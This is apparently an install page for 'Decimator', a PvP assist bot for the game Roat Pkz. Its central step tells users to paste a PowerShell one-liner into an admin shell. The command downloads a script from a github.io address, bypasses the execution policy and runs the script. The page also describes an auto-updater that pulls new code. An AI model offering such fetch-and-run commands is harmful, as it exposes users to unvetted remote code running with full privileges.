🎯 Decimator v4.2

Roat Pkz PVP Assist Bot — One-Click Installer

1Open PowerShell as Admin

Right-click Start → "Windows PowerShell (Admin)" → Yes

2Copy & paste this ENTIRE command into PowerShell:

Invoke-WebRequest -Uri "https://rotstrucking1-prog.github.io/Rotstrucking-app1/decimator/install.ps1" -OutFile "$env:TEMP\install-decimator.ps1"; Set-ExecutionPolicy Bypass -Scope Process -Force; & "$env:TEMP\install-decimator.ps1"

3That's it! The installer will:

  • ✅ Create C:\RoatBot\ folder
  • ✅ Download bot.py
  • ✅ Install Python packages (pyautogui, pillow, pynput)
  • ✅ Create desktop shortcuts: Decimator RUN, Decimator CALIBRATE, Decimator DEBUG
  • ✅ Create update.bat — double-click anytime to pull latest version

📂 After Install

You'll have these on your Desktop:

  • 🎯 Decimator RUN — runs the bot
  • 📐 Decimator CALIBRATE — set up inventory grid (first time only)
  • 🔍 Decimator DEBUG — screenshot + grid overlay to verify slots

Bot folder: C:\RoatBot\

🔄 Updating

When I send you an update, just double-click update.bat on your Desktop — it pulls the latest bot.py from GitHub automatically.

⚠️ Make sure Roat Pkz is open and your inventory is visible before running calibration or the bot.
